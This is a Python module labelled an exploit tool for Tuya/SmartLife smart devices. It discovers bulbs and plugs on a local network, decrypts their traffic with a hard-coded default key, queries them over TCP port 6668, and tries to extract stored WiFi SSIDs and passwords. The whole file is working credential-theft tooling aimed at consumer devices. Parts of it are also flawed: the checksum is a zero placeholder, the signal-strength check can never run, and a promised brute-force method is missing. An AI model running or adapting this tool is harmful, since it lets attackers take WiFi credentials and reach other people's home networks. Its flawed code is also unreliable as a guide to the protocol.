"""Tuya IoT device exploit module.

Tuya/SmartLife devices (smart bulbs, plugs, switches) use a local UDP protocol
on port 6668. Devices can be queried for their status and configuration,
which often includes stored WiFi credentials and device keys.

Protocol: Tuya Local Protocol v3.1/v3.3
- UDP broadcast discovery on port 6666/6667
- TCP control on port 6668
- Encryption: AES-128-ECB with known default key or device-specific key
"""

import json
import socket
import struct
import time
from dataclasses import dataclass, field
from hashlib import md5
from typing import Optional

from Crypto.Cipher import AES


# Tuya protocol constants
TUYA_UDP_PORT = 6666
TUYA_UDP_PORT_ENCRYPTED = 6667
TUYA_TCP_PORT = 6668
TUYA_DEFAULT_KEY = b"yGAdlopoPVldABfn"  # Known default local key
TUYA_PREFIX = b"\x00\x00\x55\xaa"
TUYA_SUFFIX = b"\x00\x00\xaa\x55"

# Command types
DP_QUERY = 0x0a      # Query device status
STATUS = 0x08        # Device status report  
CONTROL = 0x07       # Control device
HEART_BEAT = 0x09    # Heartbeat
UDP_NEW = 0x13       # UDP discovery (new protocol)


@dataclass
class TuyaDevice:
    """Discovered Tuya device information."""
    ip: str
    device_id: str = ""
    product_key: str = ""
    version: str = "3.1"
    local_key: str = ""
    wifi_ssid: str = ""
    wifi_password: str = ""
    mac: str = ""
    firmware: str = ""
    raw_data: dict = field(default_factory=dict)


def _pad(data: bytes) -> bytes:
    """PKCS7 padding."""
    pad_len = 16 - (len(data) % 16)
    return data + bytes([pad_len] * pad_len)


def _unpad(data: bytes) -> bytes:
    """Remove PKCS7 padding."""
    pad_len = data[-1]
    if pad_len > 16:
        return data
    return data[:-pad_len]


def _encrypt(data: bytes, key: bytes) -> bytes:
    """AES-128-ECB encrypt."""
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(_pad(data))


def _decrypt(data: bytes, key: bytes) -> bytes:
    """AES-128-ECB decrypt."""
    cipher = AES.new(key, AES.MODE_ECB)
    return _unpad(cipher.decrypt(data))


def _build_packet(command: int, payload: bytes, seq: int = 0) -> bytes:
    """Build a Tuya protocol packet."""
    # Header: prefix(4) + seq(4) + cmd(4) + length(4)
    data = payload
    length = len(data) + 8  # payload + suffix(4) + crc(4)

    header = struct.pack(">4sIII", TUYA_PREFIX, seq, command, length)
    # CRC32 placeholder (Tuya uses simple suffix check)
    crc = struct.pack(">I", 0)
    packet = header + data + crc + TUYA_SUFFIX
    return packet


def _parse_packet(data: bytes) -> tuple[int, bytes]:
    """Parse a Tuya protocol packet, return (command, payload)."""
    if len(data) < 20:
        return -1, b""
    # Skip prefix(4) + seq(4)
    cmd = struct.unpack(">I", data[8:12])[0]
    length = struct.unpack(">I", data[12:16])[0]
    payload = data[16:16 + length - 8]
    return cmd, payload


def discover_tuya_devices(timeout: float = 5.0) -> list[TuyaDevice]:
    """Listen for Tuya UDP broadcast announcements.

    Tuya devices broadcast their presence on UDP 6666 (unencrypted)
    and 6667 (encrypted with default key).
    """
    devices = []

    # Listen on unencrypted port
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.settimeout(timeout)
    try:
        sock.bind(("", TUYA_UDP_PORT))
        end_time = time.time() + timeout
        while time.time() < end_time:
            try:
                data, addr = sock.recvfrom(4096)
                device = _parse_discovery(data, addr[0], encrypted=False)
                if device:
                    devices.append(device)
            except socket.timeout:
                break
    except OSError:
        pass
    finally:
        sock.close()

    # Listen on encrypted port
    sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock2.settimeout(timeout)
    try:
        sock2.bind(("", TUYA_UDP_PORT_ENCRYPTED))
        end_time = time.time() + timeout
        while time.time() < end_time:
            try:
                data, addr = sock2.recvfrom(4096)
                device = _parse_discovery(data, addr[0], encrypted=True)
                if device:
                    devices.append(device)
            except socket.timeout:
                break
    except OSError:
        pass
    finally:
        sock2.close()

    return devices


def _parse_discovery(data: bytes, ip: str, encrypted: bool) -> Optional[TuyaDevice]:
    """Parse a Tuya discovery broadcast packet."""
    try:
        # Remove prefix/suffix
        if data[:4] == TUYA_PREFIX:
            _, payload = _parse_packet(data)
        else:
            payload = data

        if encrypted:
            payload = _decrypt(payload, TUYA_DEFAULT_KEY)

        info = json.loads(payload.decode("utf-8", errors="ignore"))
        device = TuyaDevice(
            ip=ip,
            device_id=info.get("gwId", info.get("devId", "")),
            product_key=info.get("productKey", ""),
            version=info.get("version", "3.1"),
            raw_data=info,
        )
        return device
    except Exception:
        return None


def probe_tuya_device(ip: str, device_id: str = "", local_key: str = "", timeout: float = 3.0) -> Optional[TuyaDevice]:
    """Actively probe a Tuya device on TCP port 6668.

    Sends a DP_QUERY to get device status. If the device responds,
    we can extract configuration data.

    Args:
        ip: Device IP address.
        device_id: Tuya device ID (if known). Try empty string for discovery.
        local_key: Device local key. Falls back to default key.
        timeout: Connection timeout.
    """
    key = local_key.encode() if local_key else TUYA_DEFAULT_KEY
    device = TuyaDevice(ip=ip, device_id=device_id, local_key=local_key)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, TUYA_TCP_PORT))

        # Send DP_QUERY
        payload_dict = {"gwId": device_id, "devId": device_id}
        payload_json = json.dumps(payload_dict).encode()
        encrypted_payload = _encrypt(payload_json, key)

        # For v3.3, payload format is: version(15bytes) + encrypted
        version_header = b"3.3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        full_payload = version_header + encrypted_payload

        packet = _build_packet(DP_QUERY, full_payload, seq=1)
        sock.send(packet)

        # Receive response
        response = sock.recv(4096)
        sock.close()

        if len(response) > 20:
            cmd, resp_payload = _parse_packet(response)
            # Try to decrypt
            try:
                # v3.3: skip first 15 bytes (version header)
                if resp_payload[:3] == b"3.3" or resp_payload[:3] == b"3.1":
                    resp_payload = resp_payload[15:]
                decrypted = _decrypt(resp_payload, key)
                resp_data = json.loads(decrypted.decode("utf-8", errors="ignore"))
                device.raw_data = resp_data

                # Extract DPS (data points)
                dps = resp_data.get("dps", {})
                device.raw_data["dps"] = dps
            except Exception:
                # Try with default key
                try:
                    decrypted = _decrypt(resp_payload, TUYA_DEFAULT_KEY)
                    resp_data = json.loads(decrypted.decode("utf-8", errors="ignore"))
                    device.raw_data = resp_data
                except Exception:
                    device.raw_data["raw_hex"] = response.hex()

        return device

    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        device.raw_data["error"] = str(e)
        return device


def extract_wifi_credentials(ip: str, local_key: str = "") -> dict:
    """Attempt to extract WiFi credentials from a Tuya device.

    Tuya devices store WiFi SSID and password for provisioning.
    Some firmware versions expose this via the local API.

    Methods:
    1. Query device DPS for WiFi config data points
    2. Send AP config query (used during pairing)
    3. Brute-force common Tuya data points

    Returns:
        Dict with ssid, password, signal, mac if found.
    """
    key = local_key.encode() if local_key else TUYA_DEFAULT_KEY
    result = {"ip": ip, "ssid": "", "password": "", "signal": "", "mac": "", "raw": {}}

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3.0)
        sock.connect((ip, TUYA_TCP_PORT))

        # Method 1: Query all DPS
        queries = [
            {"gwId": "", "devId": ""},
            {"gwId": "", "devId": "", "uid": "", "t": str(int(time.time()))},
        ]

        for query in queries:
            payload_json = json.dumps(query).encode()
            encrypted_payload = _encrypt(payload_json, key)
            version_header = b"3.3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            packet = _build_packet(DP_QUERY, version_header + encrypted_payload, seq=1)
            sock.send(packet)
            time.sleep(0.5)

            try:
                response = sock.recv(4096)
                if len(response) > 20:
                    _, resp_payload = _parse_packet(response)
                    if resp_payload[:3] in (b"3.3", b"3.1"):
                        resp_payload = resp_payload[15:]
                    try:
                        decrypted = _decrypt(resp_payload, key)
                        data = json.loads(decrypted.decode("utf-8", errors="ignore"))
                        result["raw"] = data

                        # Common WiFi DPS IDs
                        dps = data.get("dps", {})
                        # Some devices use these DPS for WiFi info
                        for dp_id, value in dps.items():
                            if isinstance(value, str):
                                val_lower = value.lower()
                                if "ssid" in val_lower or "wifi" in val_lower:
                                    result["ssid"] = value
                                # Signal strength
                                if isinstance(value, int) and -100 < value < 0:
                                    result["signal"] = str(value)
                    except Exception:
                        pass
            except socket.timeout:
                pass

        sock.close()

    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        result["error"] = str(e)

    # Method 2: UDP probe for AP mode info
    try:
        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_sock.settimeout(2.0)
        # Send Tuya discovery probe directly to device
        probe = json.dumps({"from": "app", "ip": ip}).encode()
        udp_sock.sendto(probe, (ip, TUYA_UDP_PORT))
        resp, _ = udp_sock.recvfrom(4096)
        try:
            info = json.loads(resp.decode())
            if "ssid" in info:
                result["ssid"] = info["ssid"]
            if "passwd" in info or "password" in info:
                result["password"] = info.get("passwd", info.get("password", ""))
        except Exception:
            pass
        udp_sock.close()
    except Exception:
        pass

    return result
